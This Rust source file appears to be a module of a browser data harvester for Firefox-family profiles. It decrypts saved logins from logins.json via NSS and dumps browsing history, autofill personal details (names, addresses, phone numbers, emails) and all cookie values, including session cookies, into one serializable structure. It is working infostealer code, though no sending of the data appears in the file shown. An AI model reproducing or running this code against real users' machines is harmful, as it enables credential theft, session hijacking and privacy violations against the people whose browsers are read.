use anyhow::{Result, anyhow};
use rusqlite::Connection;
use serde::{Deserialize, Serialize};
use std::fs;
use base64::{Engine as _, engine::general_purpose};

use super::nss::NssHandler;
use super::profiles::GeckoProfile;

/// Login data structure from logins.json
#[derive(Debug, Deserialize)]
pub struct LoginData {
    pub hostname: String,
    #[serde(rename = "formSubmitURL")]
    pub form_submit_url: Option<String>,
    #[serde(rename = "encryptedUsername")]
    pub encrypted_username: String,
    #[serde(rename = "encryptedPassword")]
    pub encrypted_password: String,
    #[serde(rename = "timeCreated")]
    pub time_created: Option<i64>,
    #[serde(rename = "timeLastUsed")]
    pub time_last_used: Option<i64>,
    #[serde(rename = "timePasswordChanged")]
    pub time_password_changed: Option<i64>,
    #[serde(rename = "timesUsed")]
    pub times_used: Option<i32>,
}

/// Container for login data from logins.json
#[derive(Debug, Deserialize)]
pub struct LoginJsonData {
    pub logins: Vec<LoginData>,
}

/// Extracted login entry
#[derive(Debug, Serialize)]
pub struct LoginEntry {
    pub password: String,
    pub url: String,
    pub username: String,
}

/// Browser history entry
#[derive(Debug, Serialize)]
pub struct HistoryEntry {
    pub last_visit_time: i64,
    pub title: String,
    pub url: String,
    pub visit_count: i64,
}

/// Form history entry (autofill data)
#[derive(Debug, Serialize)]
pub struct FormEntry {
    pub name: String,
    pub value: String,
}

/// Cookie entry
#[derive(Debug, Serialize)]
pub struct CookieEntry {
    pub expires_utc: i64,
    pub host: String,
    pub httponly: bool,
    pub name: String,
    pub path: String,
    pub secure: bool,
    pub value: String,
}

/// Browser data collection result
#[derive(Debug, Serialize)]
pub struct BrowserData {
    pub browser_type: String,
    pub profile_name: String,
    pub passwords: Vec<LoginEntry>,
    pub history: Vec<HistoryEntry>,
    pub form_history: Vec<FormEntry>,
    pub cookies: Vec<CookieEntry>,
}

/// Data extractor for Gecko browsers
pub struct DataExtractor;

impl DataExtractor {
    /// Extract all data from a profile
    pub fn extract_profile_data(profile: &GeckoProfile) -> Result<BrowserData> {
        println!("Processing {} profile: {}", profile.browser_type.name(), profile.name);

        // Initialize NSS for this profile
        let nss_dll_path = super::profiles::ProfileFinder::find_nss3_dll_path()
            .and_then(|p| p.to_str().map(|s| s.to_string()));

        let nss_handler = NssHandler::new(
            profile.path.to_str().unwrap(),
            nss_dll_path.as_deref(),
        )?;

        // Extract passwords
        let passwords = Self::extract_passwords(profile, &nss_handler)
            .unwrap_or_else(|e| {
                eprintln!("Failed to extract passwords from {}: {}", profile.name, e);
                Vec::new()
            });

        // Extract history
        let history = Self::extract_history(profile)
            .unwrap_or_else(|e| {
                eprintln!("Failed to extract history from {}: {}", profile.name, e);
                Vec::new()
            });

        // Extract form history
        let form_history = Self::extract_form_history(profile)
            .unwrap_or_else(|e| {
                eprintln!("Failed to extract form history from {}: {}", profile.name, e);
                Vec::new()
            });

        // Extract cookies
        let cookies = Self::extract_cookies(profile)
            .unwrap_or_else(|e| {
                eprintln!("Failed to extract cookies from {}: {}", profile.name, e);
                Vec::new()
            });

        Ok(BrowserData {
            browser_type: profile.browser_type.name().to_string(),
            profile_name: profile.name.clone(),
            passwords,
            history,
            form_history,
            cookies,
        })
    }

    /// Extract passwords from logins.json
    fn extract_passwords(profile: &GeckoProfile, nss_handler: &NssHandler) -> Result<Vec<LoginEntry>> {
        let logins_path = profile.logins_json_path();
        if !logins_path.exists() {
            return Err(anyhow!("logins.json not found"));
        }

        let content = fs::read_to_string(&logins_path)
            .map_err(|e| anyhow!("Failed to read logins.json: {}", e))?;

        let login_data: LoginJsonData = serde_json::from_str(&content)
            .map_err(|e| anyhow!("Failed to parse logins.json: {}", e))?;

        let mut login_entries = Vec::new();

        for login in login_data.logins {
            // Decode base64 encrypted data
            let encrypted_username = general_purpose::STANDARD
                .decode(&login.encrypted_username)
                .map_err(|e| anyhow!("Failed to decode username: {}", e))?;

            let encrypted_password = general_purpose::STANDARD
                .decode(&login.encrypted_password)
                .map_err(|e| anyhow!("Failed to decode password: {}", e))?;

            // Decrypt using NSS
            match (
                nss_handler.decrypt(&encrypted_username),
                nss_handler.decrypt(&encrypted_password),
            ) {
                (Ok(username), Ok(password)) => {
                    login_entries.push(LoginEntry {
                        password,
                        url: login.hostname,
                        username,
                    });
                }
                (Err(e), _) | (_, Err(e)) => {
                    eprintln!("Failed to decrypt login for {}: {}", login.hostname, e);
                    continue;
                }
            }
        }

        Ok(login_entries)
    }

    /// Extract browser history from places.sqlite
    fn extract_history(profile: &GeckoProfile) -> Result<Vec<HistoryEntry>> {
        let db_path = profile.places_db_path();
        if !db_path.exists() {
            return Err(anyhow!("places.sqlite not found"));
        }

        let conn = Connection::open(&db_path)
            .map_err(|e| anyhow!("Failed to open places.sqlite: {}", e))?;

        let mut stmt = conn.prepare(
            "SELECT url, title, last_visit_date, visit_count FROM moz_places WHERE url IS NOT NULL"
        ).map_err(|e| anyhow!("Failed to prepare history query: {}", e))?;

        let history_iter = stmt.query_map([], |row| {
            Ok(HistoryEntry {
                last_visit_time: row.get::<_, Option<i64>>(2)?.unwrap_or(0),
                title: row.get::<_, Option<String>>(1)?.unwrap_or_default(),
                url: row.get::<_, String>(0)?,
                visit_count: row.get::<_, Option<i64>>(3)?.unwrap_or(0),
            })
        }).map_err(|e| anyhow!("Failed to execute history query: {}", e))?;

        let mut entries = Vec::new();
        for entry in history_iter {
            if let Ok(history_entry) = entry {
                entries.push(history_entry);
            }
        }

        Ok(entries)
    }

    /// Extract form history from formhistory.sqlite
    fn extract_form_history(profile: &GeckoProfile) -> Result<Vec<FormEntry>> {
        let db_path = profile.formhistory_db_path();
        if !db_path.exists() {
            return Err(anyhow!("formhistory.sqlite not found"));
        }

        // Allowed form field names (whitelist from your Go code)
        let allowed_fields: std::collections::HashSet<&str> = [
            "name", "organization", "street-address", "address-level2",
            "address-level1", "postal-code", "country", "tel", "email",
            "given-name", "additional-name", "family-name", "address-line1",
            "address-line2", "address-line3", "country-name", "tel-national",
            "tel-country-code", "tel-area-code", "tel-local", "tel-local-prefix",
            "tel-local-suffix",
        ].iter().copied().collect();

        let conn = Connection::open(&db_path)
            .map_err(|e| anyhow!("Failed to open formhistory.sqlite: {}", e))?;

        let mut stmt = conn.prepare("SELECT fieldname, value FROM moz_formhistory")
            .map_err(|e| anyhow!("Failed to prepare form history query: {}", e))?;

        let form_iter = stmt.query_map([], |row| {
            let fieldname: String = row.get(0)?;
            let value: String = row.get(1)?;
            Ok((fieldname, value))
        }).map_err(|e| anyhow!("Failed to execute form history query: {}", e))?;

        let mut entries = Vec::new();
        for entry in form_iter {
            if let Ok((fieldname, value)) = entry {
                if allowed_fields.contains(fieldname.to_lowercase().as_str()) {
                    entries.push(FormEntry {
                        name: fieldname,
                        value,
                    });
                }
            }
        }

        Ok(entries)
    }

    /// Extract cookies from cookies.sqlite
    fn extract_cookies(profile: &GeckoProfile) -> Result<Vec<CookieEntry>> {
        let db_path = profile.cookies_db_path();
        if !db_path.exists() {
            return Err(anyhow!("cookies.sqlite not found"));
        }

        let conn = Connection::open(&db_path)
            .map_err(|e| anyhow!("Failed to open cookies.sqlite: {}", e))?;

        let mut stmt = conn.prepare(
            "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
        ).map_err(|e| anyhow!("Failed to prepare cookies query: {}", e))?;

        let cookie_iter = stmt.query_map([], |row| {
            Ok(CookieEntry {
                expires_utc: row.get::<_, Option<i64>>(4)?.unwrap_or(0),
                host: row.get::<_, Option<String>>(0)?.unwrap_or_default(),
                httponly: row.get::<_, Option<i64>>(6)?.unwrap_or(0) != 0,
                name: row.get::<_, Option<String>>(1)?.unwrap_or_default(),
                path: row.get::<_, Option<String>>(3)?.unwrap_or_default(),
                secure: row.get::<_, Option<i64>>(5)?.unwrap_or(0) != 0,
                value: row.get::<_, Option<String>>(2)?.unwrap_or_default(),
            })
        }).map_err(|e| anyhow!("Failed to execute cookies query: {}", e))?;

        let mut entries = Vec::new();
        for entry in cookie_iter {
            if let Ok(cookie_entry) = entry {
                entries.push(cookie_entry);
            }
        }

        Ok(entries)
    }
}
